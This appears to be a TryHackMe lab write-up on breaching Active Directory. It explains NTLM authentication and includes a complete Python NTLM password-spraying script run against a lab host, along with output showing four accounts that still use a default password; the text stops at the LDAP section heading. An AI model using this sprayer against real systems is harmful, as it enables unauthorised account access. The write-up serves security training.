---
title: THM - Breaching Active Directory
tags: [thm, windows, active directory]
---

<div style="text-align:center;">
<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/a936e45c948fb10f2eec7768c7a32e66.png" alt="Challenge logo" style="height:150px;">
</div>

This network covers techniques and tools that can be used to acquire that first set of AD credentials that can then be used to enumerate AD.

## Introduction to AD Breaches

Before we can exploit AD misconfigurations for privilege escalation, lateral movement, and goal execution, you need initial access first. You need to acquire an initial set of valid AD credentials. Due to the number of AD services and features, the attack surface for gaining an initial set of AD credentials is usually significant. 

When looking for that first set of credentials, we don't focus on the permissions associated with the account; thus, even a low-privileged account would be sufficient. We are just looking for a way to authenticate to AD, allowing us to do further enumeration on AD itself.

In this network, we will cover several methods that can be used to breach AD:

- NTLM Authentication Services
- LDAP Blind Credentials
- Authentication Relays
- Microsoft Deployment Toolkit
- Configuration Files

## NTLM Authentication Services

New Technology LAN Manager (NTLM) is the suite of protocols used to authenticate user's identified in AD. NTLM can be used for authentication by using a challenge-response-based scheme called NetNTLM. This mechanism is heavily used by the services on a network. HOwever, services that use NetNTLM can also be exposed to the internet.

NetNTLM allows the application to play the role of a middle man between the client and AD. All authentication material is forwarded to a Domain Controller in the form of a challenge, and if completed successfully, the application will authenticate the user. This means that the application is authenticating on behalf of the user and not authenticating the user directly on the application itself. This prevents the application from storing AD credentials, which should not be stored on a Domain Controller.

Since most AD enviroments have account lockout configured, we won't be able to run a full brute-force attack. Instead, we need to perform a password spraying attack. 

During the OSINT exercise you found a possible list of usernames and the organisation's initial onboarding password: `Changeme123`. We have to perform an attack against the application hosted at

```
http://ntlmauth.za.tryhackme.com
```

We have to write a simple python script to attack the authentication service

```python
#!/usr/bin/python3

import requests
from requests_ntlm import HttpNtlmAuth
import sys, getopt

class NTLMSprayer:
    def __init__(self, fqdn):
        self.HTTP_AUTH_FAILED_CODE = 401
        self.HTTP_AUTH_SUCCEED_CODE = 200
        self.verbose = True
        self.fqdn = fqdn

    def load_users(self, userfile):
        self.users = []
        lines = open(userfile, 'r').readlines()
        for line in lines:
            self.users.append(line.replace("\r", "").replace("\n", ""))

    def password_spray(self, password, url):
        print ("[*] Starting passwords spray attack using the following password: " + password)
        count = 0
        for user in self.users:
            response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
            if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
                print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
                count += 1
                continue
            if (self.verbose):
                if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                    print ("[-] Failed login with Username: " + user)
        print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")

def main(argv):
    userfile = ''
    fqdn = ''
    password = ''
    attackurl = ''

    try:
        opts, args = getopt.getopt(argv, "hu:f:p:a:", ["userfile=", "fqdn=", "password=", "attackurl="])
    except getopt.GetoptError:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)

    for opt, arg in opts:
        if opt == '-h':
            print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
            sys.exit()
        elif opt in ("-u", "--userfile"):
            userfile = str(arg)
        elif opt in ("-f", "--fqdn"):
            fqdn = str(arg)
        elif opt in ("-p", "--password"):
            password = str(arg)
        elif opt in ("-a", "--attackurl"):
            attackurl = str(arg)

    if (len(userfile) > 0 and len(fqdn) > 0 and len(password) > 0 and len(attackurl) > 0):
        #Start attack
        sprayer = NTLMSprayer(fqdn)
        sprayer.load_users(userfile)
        sprayer.password_spray(password, attackurl)
        sys.exit()
    else:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)

if __name__ == "__main__":
    main(sys.argv[1:])
```

After running the script, we found that four users are still using the default credentials.

```
[+] Valid credential pair found! Username: hollie.powell Password: Changeme123
[+] Valid credential pair found! Username: heather.smith Password: Changeme123
[+] Valid credential pair found! Username: gordon.stevens Password: Changeme123
[+] Valid credential pair found! Username: georgina.edwards Password: Changeme123
```

## LDAP Bind Credentials

